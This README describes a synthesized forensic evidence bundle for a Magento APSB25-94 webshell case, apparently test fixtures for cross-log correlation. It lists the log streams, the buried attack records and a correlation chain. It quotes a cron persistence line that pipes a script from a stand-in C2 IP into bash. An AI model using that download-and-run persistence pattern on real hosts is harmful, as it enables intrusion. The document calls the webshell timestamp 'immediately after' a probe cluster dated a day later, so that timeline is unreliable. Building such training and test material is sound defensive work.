# exhibits/fleet-01/large-corpus — APSB25-94 fleet-scale forensic bundle

Synthesized evidence bundle sized at the upper end of a realistic
hosting-provider forensic case: ~360k tokens across 8 streams, with
~75 attack-relevant records buried in ~14k records of routine traffic
and system noise. The cross-stream correlation (apache POST IP <-> cron
curl IP <-> fs mtime cluster <-> modsec preceding cluster) is the only
resolution path; no single stream resolves the case.

## Streams

| Stream | File | Volume | Attack content |
|---|---|---|---|
| Apache access | `apache.access.log` | ~3800 lines | ~5% attacker traffic clustered in a 9-min window |
| Apache error | `apache.error.log` | ~1300 lines | ~10 PHP warnings around the polyglot path |
| ModSec audit | `modsec_audit.log` | ~570 transactions (5130 lines) | 12 admin-endpoint POSTs preceding webshell drop |
| FS mtime | `fs.mtime.txt` | ~2020 paths | 3 attack-relevant: `.cache/a.php`, renamed `index.php`, touched theme |
| Cron snapshots | `cron.snapshot` | 50 user crontabs | user `magento` has injected curl-pipe-bash line |
| Process snapshot | `proc.snapshot` | ~200 procs | 0 live (staging artifact) |
| Auth journal | `journal/auth.log` | ~420 events | 0 direct (web vector, not SSH) |
| Maldet history | `maldet.quarantine` | ~500 entries | ~10 historically relevant legacy .cache hits |

## Attack needles

All needles trace back to the public Adobe APSB25-94 advisory. The C2
IP is `203.0.113.42` (RFC 5737 TEST-NET-3 documentation range — never
collides with real-world traffic). The webshell path `.cache/a.php`
matches the Magento media-cache double-extension pattern called out in
the advisory and reported publicly by Sansec.

Correlation chain (resolved only cross-stream):

1. `modsec_audit.log` transactions 280-291: POST to `/admin/sources/system/config/`
   from `203.0.113.42` at 2026-03-22T14:06-14:11Z (deserialization probe)
2. `fs.mtime.txt`: `/var/www/html/pub/media/catalog/product/.cache/a.php`
   mtime=2026-03-21T23:58:14Z (webshell staged immediately after modsec cluster)
3. `apache.access.log`: attacker GET/POST traffic to the `.cache/a.php` path
   from the same C2 IP
4. `cron.snapshot`: user `magento` cron entry — `curl -s http://203.0.113.42/c.txt|bash`
   (same C2 IP, persistence established after webshell staging)

## host-{1..7} subdirectories

Pre-generated per-host exhibits from M10/M11. These are static fixtures for
`tests/04-observe.bats`. Do not modify them — they are golden fixtures.
Regenerate only via their own synthesis scripts if needed.

## Regenerate large-corpus

```bash
tools/synth-corpus.sh --seed 42 --out exhibits/fleet-01/large-corpus
```

Output is byte-deterministic — same seed produces the same bundle.

## Sources

- Adobe Security Advisory APSB25-94 (public)
- Magento dev docs on media-cache path conventions (public)
- Apache combined CLF format spec (public)
- ModSecurity audit-log section grammar (OWASP CRS public docs)
- cron(5) man page (POSIX spec)

PolyShell operator-local corpus consulted ONLY for cadence-realism
spot checks (request density per hour, attack-to-benign ratio).
Never copied, never quoted, never parsed into output.
